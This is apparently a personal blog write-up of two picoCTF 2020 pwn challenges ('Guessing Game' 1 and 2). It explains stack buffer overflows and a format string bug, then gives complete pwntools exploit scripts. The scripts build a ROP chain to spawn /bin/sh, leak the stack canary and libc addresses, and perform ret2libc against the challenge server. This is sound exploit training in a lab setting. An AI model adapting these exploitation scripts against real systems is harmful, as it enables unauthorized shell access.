---
title: "Picoctf2020 Writeup"
date: 2022-11-26T20:50:21+08:00
summary: Guessing Game
categories: ["writeup"]
---

# PicoCTF 2020 Writeup

## Guessing Game 1

First, let's analyze compilation parameters. `-m64` means 64-bit binary. `-fno-stack-protector` means no canary. `-O0` means no magic compiler optimization, which isn't so important. `-no-pie`, good news! `-static` means ROP? A small note, if using pwntools checksec `pwn checksec vuln`, pwntools says "Canary found". I think it is due to static linking.

Then, let's read the source code. The first vulnerability is no srand which means we break the guessing part easily. The next vulnerability is fgets in win function which is a buffer overflow vulnerability. So, the idea how to exploit is ROP in static binary.

How to ROP? Our goal is to get a shell. There is no system no execve. The last we can use is syscall. One thing I learned in this challenge is pwntools ROP is not so smart. Manually written ROP is more reliable. How to create a `/bin/sh` string? Use `mov [rxx] rxx` to write this string to writeable memory.

The exploit script is as follows.

```python
import pwn

pwn.context.update(arch='amd64', os='linux', encoding='utf-8')

data_addr = 0x00000000006BA360

pop_rsi_addr = 0x0048ed33
pop_rax_addr = 0x00476407
mov_rsi_rax_addr = 0x0047ff91
syscall_addr = 0x00485e95
pop_rdi_addr = 0x0049220f
pop_rdx_addr = 0x004afe92

payload = pwn.p64(pop_rsi_addr) + pwn.p64(data_addr) + pwn.p64(pop_rax_addr) + b'/bin/sh\x00' + pwn.p64(mov_rsi_rax_addr) + pwn.p64(pop_rdi_addr) + pwn.p64(data_addr) + pwn.p64(pop_rsi_addr) + pwn.p64(0) + pwn.p64(pop_rdx_addr) + pwn.p64(0) + pwn.p64(pop_rax_addr) + pwn.p64(59) + pwn.p64(syscall_addr)


res = b"84\n" + (pwn.cyclic(0x78) + payload).ljust(360, b'0') + b"\n"

# with pwn.process("./vuln") as io:
with pwn.remote("jupiter.challenges.picoctf.org", 26735) as io:
    io.sendline(b"84")
    io.recvrepeat(0.1)
    io.sendline((pwn.cyclic(0x78) + payload).ljust(360, b'0'))
    io.interactive()

```

## Guessing Game 2

First, let's analyze compilation parameters. `-m32` means 32 bit. `-no-pie`, good news. `-Wl,-z,relro,-z,now`, means full relro. It's impossible to modify got table. And we should deal with canary this time.

Then, let's read the source code. The first vulnerability is in `get_random()`. It uses the address of `rand` function modulo 4096. We know that the last 12 bit of function address is fixed. So we can bruteforce it one time.

```python
import pwn
with pwn.remote("jupiter.challenges.picoctf.org", 57529) as io:
    for i in range(-4095, 4096):
        io.sendline(str(i).encode())
        res = io.recvrepeat(0.1)
        if "Congrats" in res.decode():
            print("Success!")
            print(i)
            break

```

The answer is -3727.

The next vulnerability is in `win` function. `gets` means a buffer overflow vulnerability. However, we need to deal with canary before exploit using ROP. `printf(winner);` means a format string vulnerability. I thought about leaking GOT table and getting information about libc. But don't know how to deal with canary. After reading others' writeup, I realized the format string vulnerability can leak the canary as well. So, the idea is leaking the canary, leaking one of the libc function address to know libc base address and ret2libc.

I use the following scripts to leak some function address of libc and use libc.rip to get the version of libc. Interestingly, there are two possible libc version, libc6-i386_2.27-3ubuntu1.5_amd64 and libc6-i386_2.27-3ubuntu1.6_amd64. Most of symbols in these two libc are just the same. I'm curious about why they look the same and find [Ubuntu packaging versioning scheme](https://wiki.ubuntu.com/AutoStatic/PackagingVersioningScheme). 2.27 is upstream version. 3 is debian revision. Ubuntu1 is Ubuntu revision. .6 is Ubuntu security revision.


```python
import pwn

pwn.context.update(arch='i686', os='linux', encoding='utf-8')

got_dict = {
    "gets": 0x08049FCC,
    "fgets": 0x08049FD0,
    "puts": 0x08049FDC,
    "printf": 0x08049FC8,
    "rand": 0x08049FF8,
    "atol": 0x08049FE4,
}

with pwn.remote("jupiter.challenges.picoctf.org", 57529) as io:
    for i, j in got_dict.items():
        payload = b"-3727\n"
        payload += pwn.p32(j) + b"%7$s\n"
        io.send(payload)
        res = io.recvrepeat(0.5)
        print(res)
        congrats_index = res.index(b"Congrats: ")
        address = hex(pwn.u32(res[congrats_index + 14: congrats_index + 18]))
        print(i, address)

```

How to get shell? I try to use one_gadget t first. I realized one_gadget in 32 bit is hard according to this [blog](https://david942j.blogspot.com/2017/02/project-one-gadget-in-glibc.html). What's more, I'm not familiar with 32 bit assembly and syscall. So, I choose `system` function to get a shell. One caveat, there should be a 4 byte padding between address of `system` and address of `/bin/sh` because normally calling `system` will push the return address into stack.

```python
import re
import pwn

pwn.context.update(arch='i686', os='linux', encoding='utf-8')

gets_plt = 0x08049FCC
sh_addr = 0x0017B9DB
gets_addr = 0x00066ce0
system_addr = 0x0003cf10

ans = "-3727"

canary_re = re.compile(r"^Name\? Congrats: (0x[0-9a-f]*)$", re.M)

with pwn.remote("jupiter.challenges.picoctf.org", 57529) as io:
    payload = ans.encode() + b"\n" + b'%135$p\n'
    io.send(payload)
    res = io.recvrepeat(0.5)
    print(res.decode())
    canary = int(canary_re.search(res.decode()).group(1), 16)

    payload = ans.encode() + b"\n" + pwn.p32(gets_plt) + b"%7$s\n"

    io.send(payload)
    res = io.recvrepeat(0.5)
    print(res)
    congrats_index = res.index(b"Congrats: ")
    address = pwn.u32(res[congrats_index + 14: congrats_index + 18])
    print(f"gets addr: {address:x}")

    libc_base = address - gets_addr

    print(hex(libc_base))

    payload = ans.encode() + b"\n" + pwn.cyclic(0x200) + pwn.p32(canary) + pwn.cyclic(12) + pwn.p32(system_addr + libc_base) + pwn.p32(0) + pwn.p32(sh_addr + libc_base) + b"\n"
    print(payload)
    io.send(payload)
    io.interactive()

```
